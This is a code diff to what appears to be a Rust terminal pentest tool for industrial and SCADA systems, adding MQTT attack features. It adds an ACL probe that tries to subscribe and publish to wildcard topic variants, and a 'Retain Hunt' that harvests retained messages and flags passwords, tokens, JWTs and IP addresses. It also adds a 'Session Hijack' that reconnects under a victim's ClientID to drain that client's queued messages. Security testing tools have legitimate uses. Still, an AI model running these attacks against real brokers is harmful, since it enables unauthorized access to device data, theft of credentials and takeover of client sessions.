@@ -530,6 +530,7 @@ enum Mode {
     References,
     OutputZoom,
     MqttMonitor,
+    MqttClientIdInput,
 }
 
 struct App {
@@ -564,6 +565,9 @@ struct App {
     mqtt_total_msgs: usize,
     mqtt_topic_list_state: ListState,
     mqtt_filter: String,
+    mqtt_attack_lines: Vec<String>,
+    mqtt_attack_scroll: usize,
+    mqtt_attack_label: String,
 }
 
 impl App {
@@ -608,6 +612,9 @@ impl App {
             mqtt_total_msgs: 0,
             mqtt_topic_list_state: ListState::default(),
             mqtt_filter: String::new(),
+            mqtt_attack_lines: Vec::new(),
+            mqtt_attack_scroll: 0,
+            mqtt_attack_label: String::new(),
         }
     }
 
@@ -800,6 +807,9 @@ impl App {
         self.mqtt_total_msgs = 0;
         self.mqtt_topic_list_state = ListState::default();
         self.mqtt_filter.clear();
+        self.mqtt_attack_lines.clear();
+        self.mqtt_attack_scroll = 0;
+        self.mqtt_attack_label.clear();
 
         let opts = ConnectOptions {
             host: ip.to_string(),
@@ -4338,7 +4348,8 @@ fn draw_header(frame: &mut Frame, area: Rect, app: &App) {
         Mode::Normal =>
             " [A] Add IP  [S] Scan  [E] Exploit  [M] MQTT  [W] References  [R] Rescan  [D] Delete  [/] Search  [O] Zoom  [C] Clear  [Z] Stealth  [?] Help  [Q] Quit",
         Mode::MqttMonitor =>
-            " [J/K/↑↓] Navigate topics  [/] Filter  [ESC/M] Disconnect",
+            " [j/k] Nav  [a] ACL  [r] Retain  [s] Session  [c] Clear  [/] Filter  [ESC/M] Disconnect",
+        Mode::MqttClientIdInput => " Enter ClientID to hijack \u{2014} [ENTER] run  [ESC] cancel",
         Mode::IpInput => " Enter IP address \u{2014} [ESC] cancel",
         Mode::ExploitMenu => " [J/K] Navigate  [ENTER] Run  [V] View as protocol  [O] Zoom  [PgUp/PgDn] Scroll  [ESC] back",
         Mode::Search => " Type to filter \u{2014} [ESC] clear  [ENTER] confirm",
@@ -4464,6 +4475,7 @@ fn draw_right_panel(frame: &mut Frame, area: Rect, app: &mut App) {
         Mode::IpInput => draw_ip_input(frame, area, app),
         Mode::Search => draw_search_panel(frame, area, app),
         Mode::MqttMonitor => draw_mqtt_panel(frame, area, app),
+        Mode::MqttClientIdInput => draw_mqtt_clientid_input(frame, area, app),
         _ => draw_detail_panel(frame, area, app),
     }
 }
@@ -5563,6 +5575,10 @@ fn handle_key(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -
             handle_mqtt_monitor(app, code);
             false
         }
+        Mode::MqttClientIdInput => {
+            handle_mqtt_client_id_input(app, code);
+            false
+        }
     }
 }
 
@@ -6203,22 +6219,37 @@ fn draw_mqtt_panel(frame: &mut Frame, area: Rect, app: &mut App) {
         .filter(|(t, _, _)| filter_lower.is_empty() || t.to_lowercase().contains(&filter_lower))
         .collect();
 
-    let detail_text = if let Some((topic, count, last_display)) = filtered.get(selected_idx) {
-        let retained_str = if app.mqtt_retained.contains(topic.as_str()) { "yes" } else { "no" };
-        format!(
-            "\n Topic:    {topic}\n\n Last:     {last_display}\n\n Messages: {count}\n Retained: {retained_str}"
-        )
-    } else if app.mqtt_session.is_some() {
-        "\n Waiting for messages…\n\n Subscribed to # and $SYS/#".to_string()
-    } else {
-        "\n (not connected)".to_string()
-    };
+    if app.mqtt_attack_lines.is_empty() {
+        let detail_text =
+            if let Some((topic, count, last_display)) = filtered.get(selected_idx) {
+                let retained_str =
+                    if app.mqtt_retained.contains(topic.as_str()) { "yes" } else { "no" };
+                format!(
+                    "\n Topic:    {topic}\n\n Last:     {last_display}\n\n Messages: {count}\n Retained: {retained_str}"
+                )
+            } else if app.mqtt_session.is_some() {
+                "\n Waiting for messages…\n\n Subscribed to # and $SYS/#\n\n [a] ACL  [r] Retain  [s] Session"
+                    .to_string()
+            } else {
+                "\n (not connected)".to_string()
+            };
 
-    frame.render_widget(
-        Paragraph::new(detail_text)
-            .block(Block::default().borders(Borders::ALL).title(" Detail ")),
-        cols[1],
-    );
+        frame.render_widget(
+            Paragraph::new(detail_text)
+                .block(Block::default().borders(Borders::ALL).title(" Detail ")),
+            cols[1],
+        );
+    } else {
+        let title = format!(" {} — press c to clear ", app.mqtt_attack_label);
+        let content = app.mqtt_attack_lines.join("\n");
+        let scroll_row = u16::try_from(app.mqtt_attack_scroll).unwrap_or(u16::MAX);
+        frame.render_widget(
+            Paragraph::new(content)
+                .block(Block::default().borders(Borders::ALL).title(title))
+                .scroll((scroll_row, 0)),
+            cols[1],
+        );
+    }
 }
 
 fn handle_mqtt_monitor(app: &mut App, code: KeyCode) {
@@ -6240,8 +6271,274 @@ fn handle_mqtt_monitor(app: &mut App, code: KeyCode) {
         KeyCode::Char('/') => {
             app.mqtt_filter.clear();
         }
+        KeyCode::Char('a') => run_tui_acl(app),
+        KeyCode::Char('r') => run_tui_retain(app),
+        KeyCode::Char('s') => {
+            app.input_buf.clear();
+            app.mode = Mode::MqttClientIdInput;
+        }
+        KeyCode::Char('c') => {
+            app.mqtt_attack_lines.clear();
+            app.mqtt_attack_scroll = 0;
+            app.mqtt_attack_label.clear();
+        }
+        KeyCode::Char('J') => {
+            if !app.mqtt_attack_lines.is_empty() {
+                let max = app.mqtt_attack_lines.len().saturating_sub(1);
+                app.mqtt_attack_scroll = (app.mqtt_attack_scroll + 1).min(max);
+            }
+        }
+        KeyCode::Char('K') => {
+            app.mqtt_attack_scroll = app.mqtt_attack_scroll.saturating_sub(1);
+        }
         _ => {}
     }
+}
+
+fn handle_mqtt_client_id_input(app: &mut App, code: KeyCode) {
+    match code {
+        KeyCode::Esc => {
+            app.input_buf.clear();
+            app.mode = Mode::MqttMonitor;
+        }
+        KeyCode::Enter => {
+            let clientid = app.input_buf.trim().to_string();
+            app.input_buf.clear();
+            app.mode = Mode::MqttMonitor;
+            if !clientid.is_empty() {
+                run_tui_session_hijack(app, &clientid);
+            }
+        }
+        KeyCode::Backspace => {
+            app.input_buf.pop();
+        }
+        KeyCode::Char(c) => {
+            app.input_buf.push(c);
+        }
+        _ => {}
+    }
+}
+
+fn draw_mqtt_clientid_input(frame: &mut Frame, area: Rect, app: &App) {
+    let popup = centered_rect(54, 22, area);
+    frame.render_widget(Clear, popup);
+    frame.render_widget(
+        Paragraph::new(format!(
+            "\n  ClientID to hijack:\n\n  > {}\u{2588}",
+            app.input_buf
+        ))
+        .block(
+            Block::default()
+                .borders(Borders::ALL)
+                .title(" Session Hijack — [ENTER] run  [ESC] cancel "),
+        ),
+        popup,
+    );
+}
+
+fn run_tui_acl(app: &mut App) {
+    let base = {
+        let filter_lower = app.mqtt_filter.to_lowercase();
+        let idx = app.mqtt_topic_list_state.selected().unwrap_or(0);
+        let filtered: Vec<&String> = app
+            .mqtt_topics
+            .iter()
+            .filter(|(t, _, _)| filter_lower.is_empty() || t.to_lowercase().contains(&filter_lower))
+            .map(|(t, _, _)| t)
+            .collect();
+        filtered.get(idx).map(|t| (*t).clone())
+    };
+    let Some(base) = base else { return };
+    let Some(session) = app.mqtt_session.as_mut() else { return };
+
+    let sep = "─".repeat(60);
+    let mut lines = vec![
+        format!(" ACL probe: {base}"),
+        sep.clone(),
+        format!("{:<26} {}", "variant", "access"),
+        sep.clone(),
+    ];
+
+    let mut tested = std::collections::HashSet::new();
+    let variants = mqtt_acl_variants(&base);
+    for variant in variants {
+        if tested.len() >= 20 {
+            lines.push("[limit] max 20 variants reached.".into());
+            break;
+        }
+        if !tested.insert(variant.clone()) {
+            continue;
+        }
+        let sub_ok = session.subscribe(&variant, 0).is_ok();
+        let rx_count = if sub_ok {
+            let dl = std::time::Instant::now() + Duration::from_millis(500);
+            let mut n = 0usize;
+            while std::time::Instant::now() < dl {
+                n += session.drain_messages().len();
+                std::thread::sleep(Duration::from_millis(50));
+            }
+            let _ = session.unsubscribe(&variant);
+            n
+        } else {
+            0
+        };
+        let pub_ok = session.publish(&variant, b"scadaver/acl-probe", 0, false).is_ok();
+        let sl = if sub_ok { format!("SUB:YES({rx_count})") } else { "SUB:NO    ".into() };
+        let pl = if pub_ok { "PUB:YES" } else { "PUB:NO " };
+        lines.push(format!("[{sl:<12} {pl}]  {variant}"));
+    }
+    lines.push(sep);
+    lines.push(format!(" {} variant(s) tested.", tested.len()));
+    app.mqtt_attack_lines = lines;
+    app.mqtt_attack_scroll = 0;
+    app.mqtt_attack_label = "ACL Probe".into();
+}
+
+fn run_tui_retain(app: &mut App) {
+    let Some(session) = app.mqtt_session.as_mut() else { return };
+    let _ = session.subscribe("#", 0);
+
+    let sep = "─".repeat(60);
+    let mut lines = vec![" Retain Hunt (5s)".to_string(), sep.clone()];
+
+    let deadline = std::time::Instant::now() + Duration::from_secs(5);
+    let mut retained_count = 0usize;
+    let mut sensitive_count = 0usize;
+
+    while std::time::Instant::now() < deadline {
+        for msg in session.drain_messages() {
+            if !msg.retain {
+                continue;
+            }
+            retained_count += 1;
+            let (fmt, display) = detect_payload_tui(&msg.topic, &msg.payload);
+            let sensitive = tui_payload_is_sensitive(&display, &msg.topic);
+            if sensitive {
+                sensitive_count += 1;
+            }
+            let flag = if sensitive { "[SENSITIVE]" } else { "[         ]" };
+            lines.push(format!("{flag}  {} : {}  [{fmt}]", msg.topic, display));
+        }
+        std::thread::sleep(Duration::from_millis(50));
+    }
+    lines.push(sep);
+    lines.push(format!(" {retained_count} retained, {sensitive_count} sensitive."));
+    app.mqtt_attack_lines = lines;
+    app.mqtt_attack_scroll = 0;
+    app.mqtt_attack_label = "Retain Hunt".into();
+}
+
+fn run_tui_session_hijack(app: &mut App, clientid: &str) {
+    let (host, port) = match app.mqtt_broker.rsplit_once(':') {
+        Some((h, p)) => match p.parse::<u16>() {
+            Ok(p) => (h.to_string(), p),
+            Err(_) => return,
+        },
+        None => return,
+    };
+
+    let sep = "─".repeat(60);
+    let mut lines = vec![
+        format!(" Session Hijack: clientid={clientid}"),
+        sep.clone(),
+    ];
+
+    let opts = ConnectOptions {
+        host,
+        port,
+        client_id: clientid.to_string(),
+        keepalive: 30,
+        clean_session: false,
+        username: None,
+        password: None,
+        will: None,
+    };
+
+    let mut hijack = match MqttSession::connect(&opts) {
+        Ok(s) => {
+            let state = if s.session_present {
+                "YES (queued messages incoming)"
+            } else {
+                "NO (fresh session / victim wiped)"
+            };
+            lines.push(format!("[+] Connected. Session present: {state}"));
+            s
+        }
+        Err(e) => {
+            lines.push(format!("[-] Connect failed: {e:#}"));
+            app.mqtt_attack_lines = lines;
+            app.mqtt_attack_label = "Session Hijack".into();
+            return;
+        }
+    };
+
+    let _ = hijack.subscribe("#", 1);
+    lines.push("[*] Draining for 5s (QoS 1)...".into());
+
+    let deadline = std::time::Instant::now() + Duration::from_secs(5);
+    let mut total = 0usize;
+    let mut unique: std::collections::HashSet<String> = std::collections::HashSet::new();
+
+    while std::time::Instant::now() < deadline {
+        for msg in hijack.drain_messages() {
+            total += 1;
+            unique.insert(msg.topic.clone());
+            let (fmt, display) = detect_payload_tui(&msg.topic, &msg.payload);
+            let tag = if msg.retain { "R" } else { "Q" };
+            lines.push(format!("[{tag}] {} : {}  [{fmt}]", msg.topic, display));
+        }
+        std::thread::sleep(Duration::from_millis(50));
+    }
+    let _ = hijack.disconnect();
+
+    lines.push(sep);
+    lines.push(format!(" {total} messages, {} unique topics.", unique.len()));
+    app.mqtt_attack_lines = lines;
+    app.mqtt_attack_scroll = 0;
+    app.mqtt_attack_label = "Session Hijack".into();
+}
+
+fn mqtt_acl_variants(topic: &str) -> Vec<String> {
+    let parts: Vec<&str> = topic.split('/').collect();
+    let mut out = Vec::new();
+
+    out.push(topic.to_string());
+    for i in 0..parts.len() {
+        let mut v = parts.clone();
+        v[i] = "+";
+        out.push(v.join("/"));
+    }
+    for depth in 0..=parts.len() {
+        let v = if depth == 0 {
+            "#".to_string()
+        } else {
+            format!("{}/#", parts[..depth].join("/"))
+        };
+        out.push(v);
+    }
+
+    let mut seen = std::collections::HashSet::new();
+    out.retain(|v| seen.insert(v.clone()));
+    out
+}
+
+fn tui_payload_is_sensitive(display: &str, topic: &str) -> bool {
+    if display.contains("eyJ") {
+        return true;
+    }
+    let haystack = format!("{} {}", display.to_lowercase(), topic.to_lowercase());
+    for kw in &["password", "passwd", "secret", "token", "credential", "apikey", "api_key"] {
+        if haystack.contains(kw) {
+            return true;
+        }
+    }
+    let dot_parts: Vec<&str> = display.split('.').collect();
+    if dot_parts.len() == 4
+        && dot_parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
+    {
+        return true;
+    }
+    false
 }
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
@@ -6712,6 +7009,9 @@ mod tests {
             mqtt_total_msgs: 0,
             mqtt_topic_list_state: ListState::default(),
             mqtt_filter: String::new(),
+            mqtt_attack_lines: Vec::new(),
+            mqtt_attack_scroll: 0,
+            mqtt_attack_label: String::new(),
         }
     }
 
